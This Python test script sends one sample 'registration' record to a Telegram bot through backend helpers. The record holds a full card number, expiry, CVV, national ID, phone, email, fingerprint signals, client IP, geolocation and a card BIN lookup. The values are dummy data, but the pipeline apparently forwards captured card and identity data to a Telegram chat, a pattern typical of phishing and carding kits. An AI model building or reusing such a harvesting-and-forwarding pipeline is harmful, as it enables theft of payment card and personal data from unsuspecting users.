#!/usr/bin/env python3
"""Send one Bango-style Telegram (BIN block + network) for manual testing. Requires .env: DEMO_TELEGRAM_BOT_TOKEN, DEMO_TELEGRAM_CHAT_ID."""

from __future__ import annotations

import os
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from dotenv import load_dotenv  # noqa: E402

load_dotenv(ROOT / ".env", override=True, interpolate=False)

from backend import ip_geo  # noqa: E402
from backend.telegram_notify import (  # noqa: E402
    format_demo_registration_message,
    send_telegram_html,
)


def main() -> int:
    tok = (os.environ.get("DEMO_TELEGRAM_BOT_TOKEN") or "").strip()
    chat = (os.environ.get("DEMO_TELEGRAM_CHAT_ID") or "").strip()
    if not tok or not chat:
        print(
            "Missing DEMO_TELEGRAM_BOT_TOKEN or DEMO_TELEGRAM_CHAT_ID in .env",
            file=sys.stderr,
        )
        return 1
    # PAN starting with 4111111… (first 6 digits for HandyAPI: 411111)
    reg = {
        "fname": "Test",
        "lname": "BIN",
        "email": "test@lab.local",
        "phone": "0501234567",
        "personal_id": "123456789",
        "full_name": "Test BIN",
        "card_number": "4111111000000000",
        "card_exp": "12/30",
        "cvv_len": "123",
        "fingerprint_signals": {},
    }
    geo = ip_geo.lookup_ip_public("127.0.0.1")
    msg = format_demo_registration_message(
        reg,
        client_ip="127.0.0.1",
        user_agent="BangoTest/1.0 (tools/send_test_telegram.py)",
        ip_geo=geo,
    )
    ok = send_telegram_html(
        tok,
        chat,
        msg,
        message_thread_id=(os.environ.get("DEMO_TELEGRAM_THREAD_ID") or "").strip() or None,
    )
    print("sendMessage:", "ok" if ok else "failed")
    return 0 if ok else 2


if __name__ == "__main__":
    raise SystemExit(main())
